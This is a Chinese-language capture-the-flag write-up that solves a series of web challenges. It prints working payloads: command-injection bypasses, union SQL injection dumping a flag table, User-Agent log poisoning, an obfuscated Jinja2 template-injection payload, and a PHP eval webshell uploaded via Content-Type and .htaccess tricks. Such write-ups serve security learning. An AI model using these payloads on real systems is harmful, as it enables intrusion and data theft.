@@ -1,0 +1,480 @@
+<h3 id="RceMe"><a href="#RceMe" class="headerlink" title="RceMe"></a>RceMe</h3><h1 id=""><a href="#" class="headerlink" title=""></a><img src="/../picture/image-20250409193626219.png" alt="image-20250409193626219"></h1><p>这题只限制了payload为五字符以内</p>
+<p>先传   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?com=ls / </span><br></pre></td></tr></table></figure>
+
+<p> 得出flag目录</p>
+<p><img src="/../picture/image-20250409193810014.png" alt="image-20250409193810014"></p>
+<p>读取flag文件的话  通过nl命令</p>
+<ol>
+<li><strong>使用<code>nl</code>命令</strong>：<code>nl</code>是用于添加行号的命令，支持短路径通配符。</li>
+<li><strong>通配符匹配路径</strong>：<code>/*</code>匹配根目录下的所有文件，假设<code>/flag</code>是其中唯一可读的文件。</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?com=nl /*</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>命令长度</strong>：<code>n</code> + <code>l</code> + 空格 + <code>/</code> + <code>*</code> → 共5个字符。</li>
+<li><strong>执行效果</strong>：列出根目录下所有文件的内容（带行号），若<code>/flag</code>存在且可读，其内容将被输出</li>
+</ul>
+<p><img src="/../picture/image-20250409194202918.png" alt="image-20250409194202918"></p>
+<h3 id="ezGame"><a href="#ezGame" class="headerlink" title="ezGame"></a>ezGame</h3><p>很明显需要你得分高于2048（游戏高手可以选择自己慢慢玩QAQ）</p>
+<p>查看源码   搜索score</p>
+<p><img src="/../picture/image-20250409194404529.png" alt="image-20250409194404529"></p>
+<h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><p>req.open(“GET”, “flag.php?score&#x3D;” + obj.score, true);  &#x2F;&#x2F; 打开 GET 请求，URL 里包含 score 参数</p>
+<p>可以看出最后分数是会经过GET请求的进行flag.php?score&#x3D;？ 的访问进行验证</p>
+<p>所以我们可以直接构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/flag.php?score=2048   </span><br></pre></td></tr></table></figure>
+
+<p>来得到flag<img src="/../picture/image-20250409195023071.png" alt="image-20250409195023071"></p>
+<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><p>上面可以看到最后应该是  obj.score  的值赋给了  score  并通过 <code>obj.score</code> 的值来查询服务器</p>
+<p>然后再通过  getFlag()方法执行这一段代码  弹出服务器返回的响应内容</p>
+<p>所以我们也可以在控制台对   obj.score 赋值  </p>
+<p>执行obj.score&#x3D;2048</p>
+<p>再通过obj.getFlag()来返回响应内容</p>
+<p>因为最后是通过obj.getFlag();  调用getFlag方法</p>
+<p><img src="/../picture/image-20250409195656195.png" alt="image-20250409195656195"></p>
+<p>所以我们依次在控制台中输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">obj.score=2048</span><br><span class="line"></span><br><span class="line">obj.getFlag();</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/../picture/image-20250409195945130.png" alt="image-20250409195945130"></p>
+<h3 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h3><p><img src="/../picture/image-20250409200254801.png" alt="image-20250409200254801"></p>
+<p>这题过滤了分号</p>
+<p>可以通过  </p>
+<p>“换行符  %0a“   ” 逻辑运算符   ||“    ”管道符    |“进行绕过</p>
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0als /   </span><br><span class="line"></span><br><span class="line">?ip=|| ls /</span><br><span class="line"></span><br><span class="line">?ip=| ls /</span><br></pre></td></tr></table></figure>
+
+<p>然后再cat  &#x2F;flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0a cat /flag</span><br><span class="line"></span><br><span class="line">?ip=|| cat /flag</span><br><span class="line"></span><br><span class="line">?ip=| cat /flag</span><br></pre></td></tr></table></figure>
+
+<p>这三个绕过都是可以的</p>
+<p><img src="/../picture/image-20250409201416796.png" alt="image-20250409201416796"></p>
+<p><img src="/../picture/image-20250409201501661.png" alt="image-20250409201501661"></p>
+<h3 id="商师一日游"><a href="#商师一日游" class="headerlink" title="商师一日游"></a>商师一日游</h3><p>挨个访问慢慢找就行了</p>
+<p><img src="/../picture/image-20250409201604015.png" alt="image-20250409201604015"></p>
+<p>访问后查看源代码   </p>
+<p><img src="/../picture/image-20250409201636139.png" alt="image-20250409201636139"></p>
+<p><strong>第一个碎片sqctf{</strong>    </p>
+<p>继续访问&#x2F;atc2cnzd.php</p>
+<p><img src="/../picture/image-20250409201717494.png"></p>
+<p>fish牌的曲奇饼  刻下stong字样</p>
+<p>改cookie：fish&#x3D;strong</p>
+<p><img src="/../picture/image-20250409201816922.png" alt="image-20250409201816922"></p>
+<p><strong>第二个碎片：5444</strong></p>
+<p>继续访问 &#x2F;atc3oklm.php    </p>
+<p><img src="/../picture/image-20250409201918137.png" alt="image-20250409201918137"></p>
+<p>在devtool网络栏里找信息</p>
+<p><img src="/../picture/image-20250409202009593.png" alt="image-20250409202009593"></p>
+<p><strong>第三个碎片：29c1e8</strong></p>
+<p>继续访问 &#x2F;atc4zztg.php</p>
+<p><img src="/../picture/image-20250409202055980.png" alt="image-20250409202055980"></p>
+<p>访问robots.txt</p>
+<p><img src="/../picture/image-20250409202119026.png" alt="image-20250409202119026"></p>
+<p><strong>第四个碎片：de4a2f8</strong></p>
+<p>继续访问&#x2F;atc5uupl.php</p>
+<p><img src="/../picture/image-20250409202449181.png" alt="image-20250409202449181"></p>
+<p>利用换行符  %0a  绕过即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: ?hhh=php%0aphp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409202639107.png" alt="image-20250409202639107"></p>
+<p>第五个碎片:4933a953</p>
+<p>继续访问 &#x2F;atc6ertg.php</p>
+<p><img src="/../picture/image-20250409202740096.png" alt="image-20250409202740096"></p>
+<p>不让点  看源码</p>
+<p><img src="/../picture/image-20250409202808619.png" alt="image-20250409202808619"></p>
+<p>通过  disabled  限制了我们点击   把disabled删掉   或者改成  abled  都行</p>
+<p>在查看器里直接修改  修改完  回车  就可以点了</p>
+<p><img src="/../picture/image-20250409203014300.png" alt="image-20250409203014300"></p>
+<p><img src="/../picture/image-20250409203216416.png" alt="image-20250409203216416"></p>
+<p>第六个碎片:c5f4d</p>
+<p>继续前进</p>
+<p><img src="/../picture/image-20250409203250662.png" alt="image-20250409203250662"></p>
+<p>POST传参命令执行的   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory=system(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409203334921.png" alt="image-20250409203334921"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory=system(&#x27;cat Tourist_fragment7&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409203417204.png" alt="image-20250409203417204"></p>
+<p>最后一块碎片:  ed}</p>
+<p>拼接起来就行了</p>
+<h3 id="小小查询系统"><a href="#小小查询系统" class="headerlink" title="小小查询系统"></a>小小查询系统</h3><p><img src="/../picture/image-20250409203652517.png" alt="image-20250409203652517"></p>
+<p>get传参id   sql注入</p>
+<p>先判断是字符型还是数字型注入   ?id&#x3D;1   ?id&#x3D;2-1  返回的结果不一样可知是字符型注入</p>
+<p>判断闭合方式   闭合方式应该为单引号闭合   那不应该是   <strong>‘1’’</strong> 报错吗？</p>
+<p><img src="/../picture/image-20250409204510008.png" alt="image-20250409204510008"></p>
+<p>接下来通过  order by  来判断有几列    判断出有3列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+    </span><br><span class="line"></span><br><span class="line">?id=1&#x27; order by 4 --+   </span><br></pre></td></tr></table></figure>
+
+<p>–+是注释到后面的内容   防止sql注入产生错误</p>
+<p><img src="/../picture/image-20250409204952168.png" alt="image-20250409204952168">  </p>
+<p><img src="/../picture/image-20250409205003296.png" alt="image-20250409205003296"></p>
+<p>下面使用<strong>union联合注入</strong>查询</p>
+<p>先查询数据库的名字    ?id&#x3D;-1’ union select 1,2,database() –+        (-1’是为了让前面查询失效  以此来执行后面的注入语句)    数据库名字 security</p>
+<p><img src="/../picture/image-20250409205417955.png" alt="image-20250409205417955"></p>
+<p>去查询表名信息  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,table_name,3 from information_schema.tables --+</span><br></pre></td></tr></table></figure>
+
+<p><strong>数据库information_schema-&gt;数据表tables-&gt;数据列table_name</strong></p>
+<p><strong><img src="/../picture/image-20250409210014642.png" alt="image-20250409210014642"></strong></p>
+<p>查询到了  有一个flag数据表  但是还没有flag的数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_schema,&#x27;,&#x27;,table_name) from information_schema.tables where table_name=&#x27;flag&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>在页面的第三列中返回 <code>table_schema</code> 和 <code>table_name</code>，用 <code>group_concat</code> 拼接</p>
+<p>条件是 <code>table_name = &#39;flag&#39;</code>；</p>
+<p>这条语句将会返回所有表名是 <code>flag</code> 的表的【数据库名和表名】</p>
+<p>查询到了数据库名是 <code>ctf，表名是 </code>flag&#96;。</p>
+<p><img src="/../picture/image-20250409210812998.png" alt="image-20250409210812998"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; and table_schema=&#x27;ctf&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250410170202051.png" alt="image-20250410170202051"></p>
+<p>枚举数据库 <code>ctf</code> 中名为 <code>flag</code> 的表的所有字段（列）名称。</p>
+<p><code>group_concat(column_name)</code>：将所有满足条件的列名拼接在一起，用逗号分隔。</p>
+<p>现在知道：</p>
+<ul>
+<li>数据库：<code>ctf</code></li>
+<li>表名：<code>flag</code></li>
+<li>字段名：<code>value</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(value) from ctf.flag --+</span><br></pre></td></tr></table></figure>
+
+<p>用来读取 <code>ctf</code> 数据库中的 <code>flag</code> 表的所有 <code>value</code> 数据，并将它们连接成一个字符串。  得到flag</p>
+<p><img src="/../picture/image-20250409211638092.png" alt="image-20250409211638092"></p>
+<h3 id="baby-include"><a href="#baby-include" class="headerlink" title="baby include"></a>baby include</h3><p><img src="/../picture/image-20250409212529723.png" alt="image-20250409212529723"></p>
+<p>日志文件包含漏洞</p>
+<p>ban了   php  data   filter  input</p>
+<p>读取一下&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?look=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409212951218.png" alt="image-20250409212951218"></p>
+<p>发现是user-agent头里的东西</p>
+<p>在user-agent请求头里  写shell   </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在日志文件目录里注入的话  访问两次(刷新一下) 出现你执行命令的那次日志记录  </p>
+<p>发现了flag.php</p>
+<p><img src="/../picture/image-20250409213104295.png" alt="image-20250409213104295"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php system(&#x27;cat flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>查看源代码  得到flag</p>
+<p><img src="/../picture/image-20250409213250525.png" alt="image-20250409213250525"></p>
+<p><img src="/../picture/image-20250409213435590.png" alt="image-20250409213435590"></p>
+<h3 id="Input-a-number"><a href="#Input-a-number" class="headerlink" title="Input a number"></a>Input a number</h3><p><img src="/../picture/image-20250409213510570.png" alt="image-20250409213510570"></p>
+<p>intval函数绕过</p>
+<p>这题直接利用小数点绕过就行了</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sqctf=114514.1</span><br></pre></td></tr></table></figure>
+
+<p>intval函数会自动把114514.1转换成整数(返回个位数)114514</p>
+<p><img src="/../picture/image-20250409214050075.png" alt="image-20250409214050075"></p>
+<h3 id="Ez-calculate"><a href="#Ez-calculate" class="headerlink" title="Ez_calculate"></a>Ez_calculate</h3><p><img src="/../picture/image-20250409214242620.png" alt="image-20250409214242620"></p>
+<p>调教ai生成脚本(源码直接扔过去看看就行)</p>
+<p><img src="/../picture/image-20250409214312854.png" alt="image-20250409214312854"></p>
+<p>最终脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:30517/&quot;</span>  <span class="comment"># 你页面的地址</span></span><br><span class="line">session = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一步：获取页面和表达式</span></span><br><span class="line">r = session.get(url)</span><br><span class="line">html = r.text</span><br><span class="line">expr = re.search(<span class="string">r&#x27;&lt;div class=&quot;challenge&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>, html).group(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Expression:&quot;</span>, expr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二步：计算结果</span></span><br><span class="line">result = <span class="built_in">eval</span>(expr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Answer:&quot;</span>, result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三步：提交 POST 请求</span></span><br><span class="line">res = session.post(url, data=&#123;<span class="string">&quot;value&quot;</span>: result&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Response:\n&quot;</span>, res.text)</span><br><span class="line"><span class="comment"># 第四步：访问 /flag 页面获取 flag</span></span><br><span class="line">flag_url = url + <span class="string">&quot;flag&quot;</span> <span class="keyword">if</span> <span class="keyword">not</span> url.endswith(<span class="string">&quot;/&quot;</span>) <span class="keyword">else</span> url + <span class="string">&quot;flag&quot;</span></span><br><span class="line">flag_res = session.get(flag_url)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] FLAG 页面返回内容：\n&quot;</span>, flag_res.text)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409214442128.png" alt="image-20250409214442128"></p>
+<p>也可以直接在控制台跑js代码(要在两秒时间结束前运行；好像有可能失败  失败的话就多试几次)</p>
+<p><img src="/../picture/image-20250410120806996.png" alt="image-20250410120806996"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> url = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>;  <span class="comment">// 获取当前页面的 URL</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取页面中的表达式</span></span><br><span class="line"><span class="keyword">const</span> expressionElement = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.challenge&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!expressionElement) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;未找到表达式！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> expression = expressionElement.<span class="property">textContent</span>.<span class="title function_">trim</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Expression found: <span class="subst">$&#123;expression&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算表达式</span></span><br><span class="line"><span class="keyword">let</span> answer;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    answer = <span class="built_in">eval</span>(expression);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] Calculated answer: <span class="subst">$&#123;answer&#125;</span>`</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;[-] Eval failed:&quot;</span>, error);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交答案</span></span><br><span class="line"><span class="keyword">const</span> form = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!form) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;未找到表单元素！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> input = form.<span class="title function_">querySelector</span>(<span class="string">&#x27;input[name=&quot;value&quot;]&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!input) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;未找到答案输入框！&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置输入框的值为计算的答案</span></span><br><span class="line">input.<span class="property">value</span> = answer;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 提交表单</span></span><br><span class="line">form.<span class="title function_">submit</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Form submitted!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待页面刷新，尝试获取 flag</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> flagLink = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;a[href=&quot;/flag&quot;]&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (flagLink) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] Found /flag link, attempting to fetch the flag...&quot;</span>);</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = flagLink.<span class="property">href</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[-] No flag link found.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, <span class="number">1000</span>);  <span class="comment">// 等待 1 秒，确保页面刷新后再尝试获取 flag</span></span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250410121025625.png" alt="image-20250410121025625"></p>
+<p><img src="/../picture/image-20250410121039169.png" alt="image-20250410121039169"></p>
+<h3 id="My-Blog"><a href="#My-Blog" class="headerlink" title="My Blog"></a>My Blog</h3><p><img src="/../picture/image-20250409214857486.png" alt="image-20250409214857486"></p>
+<p>点击Github  可以发现一个pdf文件   里面有username  与  password</p>
+<p><img src="/../picture/image-20250409214934172.png" alt="image-20250409214934172"></p>
+<p>看见用户密码了   这边就直接猜测有login.php就可以了  就不扫描了</p>
+<p>登录成功  获得flag</p>
+<p><img src="/../picture/image-20250409215010099.png" alt="image-20250409215010099"></p>
+<p><img src="/../picture/image-20250409215042931.png" alt="image-20250409215042931"></p>
+<h3 id="唯一"><a href="#唯一" class="headerlink" title="唯一"></a>唯一</h3><p><img src="/../picture/image-20250409215106283.png" alt="image-20250409215106283"></p>
+<p>没有提示的   只能猜测注入点</p>
+<p>笔记  note   </p>
+<p>GET传参  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?note=7</span><br></pre></td></tr></table></figure>
+
+<p>试试</p>
+<p><img src="/../picture/image-20250409215223464.png" alt="image-20250409215223464"></p>
+<p>发现回显了7   </p>
+<p>注入  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?note=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409215254275.png" alt="image-20250409215254275"></p>
+<p>这里可以判断出来应该是jinja2模板注入</p>
+<p>这里我直接用的我们之前写题存的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?note=&#123;&#123;lipsum|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;get&quot;)(&quot;\u006f\u0073&quot;)|attr(&quot;\u0070\u006f\u0070\u0065\u006e&quot;)(&quot;\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067&quot;)|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409215514805.png" alt="image-20250409215514805"></p>
+<h3 id="白月光"><a href="#白月光" class="headerlink" title="白月光"></a>白月光</h3><p><img src="/../picture/image-20250410122120762.png" alt="image-20250410122120762"></p>
+<p><img src="/../picture/image-20250410122133292.png" alt="image-20250410122133292"></p>
+<p>输入49   返回  49</p>
+<p>jinja2模板注入</p>
+<p>还是直接使用了上面那个payload   得到flag</p>
+<p><img src="/../picture/image-20250410122426898.png" alt="image-20250410122426898"></p>
+<p><img src="/../picture/image-20250410122407058.png" alt="image-20250410122407058"></p>
+<h3 id="Upload-Level1"><a href="#Upload-Level1" class="headerlink" title="Upload_Level1"></a>Upload_Level1</h3><p><img src="/../picture/image-20250409215631060.png" alt="image-20250409215631060"></p>
+<p>只能传.jpg .png .gif</p>
+<p>写木马  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 命名为jpg文件   上传</p>
+<p> burpsuite抓包  改后缀为php就能绕过</p>
+<p><img src="/../picture/image-20250409215758573.png" alt="image-20250409215758573"></p>
+<p>也就是让   Content-Type为 image&#x2F;jpeg   因为它检测的是这里  改上面后缀为php</p>
+<p>发包</p>
+<p><img src="/../picture/image-20250409215938742.png" alt="image-20250409215938742"></p>
+<p>访问&#x2F;upload&#x2F;shell.php   执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250409220624808.png" alt="image-20250409220624808"></p>
+<h3 id="Upload-Level2"><a href="#Upload-Level2" class="headerlink" title="Upload_Level2"></a>Upload_Level2</h3><p>只能传jpg和png</p>
+<p>这题可以利用.htaccess文件绕过</p>
+<p>.htaccess文件内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Sethandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
+
+<p>用来将上传的所有文件  当成php文件来执行</p>
+<p>上传.htaccess文件  抓包</p>
+<p>改Content-type为  image&#x2F;jpeg   这题也是检测的这里</p>
+<p><img src="/../picture/image-20250409221059282.png" alt="image-20250409221059282"></p>
+<p>然后发包   上传成功可以了</p>
+<p><img src="/../picture/image-20250409221147385.png" alt="image-20250409221147385"></p>
+<p>然后再上传含一句话木马的jpg文件</p>
+<p><img src="/../picture/image-20250409221415755.png" alt="image-20250409221415755"></p>
+<p>这个时候   shell.jpg文件  就已经被当成  shell.php文件执行了   也就是一句话木马注入成功</p>
+<p>访问  &#x2F;uploads&#x2F;shell.jpg  跟上面一样进行命令执行即可</p>
+<p><img src="/../picture/image-20250409221755986.png" alt="image-20250409221755986"></p>
+<h3 id="图片展示功能"><a href="#图片展示功能" class="headerlink" title="图片展示功能"></a>图片展示功能</h3><p>这个用跟上面upload_level2一样的方法就行</p>
+<p>这个不用bp抓包改Content-type类型了   直接上传.htaccess文件  再传图片马就行了</p>
+<p>传成功访问返回路径upload&#x2F;shell.jpg  执行命令</p>
+<p><img src="/../picture/image-20250413105021280.png" alt="image-20250413105021280"></p>
+<p><img src="/../picture/image-20250413105032638.png" alt="image-20250413105032638"></p>
+<h3 id="baby-rce"><a href="#baby-rce" class="headerlink" title="baby rce"></a>baby rce</h3><p><img src="/../picture/image-20250410114240366.png" alt="image-20250410114240366"></p>
+<p><code>extract($_GET)</code>，这段代码会将 <code>$_GET</code> 数组中的 <code>param1</code> 和 <code>param2</code> 转换为 PHP 变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($token)&#123;</span><br><span class="line">    call_user_func($_POST[&#x27;payload&#x27;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="../picture/image-20250410121519837.png" alt="image-20250410121519837" style="zoom:200%;" />
+
+<p>由于 <code>call_user_func</code> 允许执行任意函数，攻击者可以利用这个函数来实例化 <code>TYctf</code> 类并调用 <code>getKey</code> 方法，执行echo $flag    从而获取 flag。</p>
+<p>也就是  我们只需要让$token&#x3D;true   这里只需要param1的参数&#x3D;param2的参数就行   </p>
+<p>然后再通过call_user_func函数调用TYctf::getKey</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET:   ?param1=1&amp;param2=1</span><br><span class="line"></span><br><span class="line">POST:  payload=TYctf::getKey</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../picture/image-20250410122005930.png" alt="image-20250410122005930"></p>
+<h3 id="eeaassyy"><a href="#eeaassyy" class="headerlink" title="eeaassyy"></a>eeaassyy</h3><p>按两次F12打开devtool  看到flag</p>
+<p><img src="/../picture/image-20250410122524229.png" alt="image-20250410122524229"></p>
+<h3 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h3><p><img src="/../picture/image-20250410122824054.png" alt="image-20250410122824054"></p>
+<p>反序列化</p>
+<p>直接丢给ai  都能直接跑出payload</p>
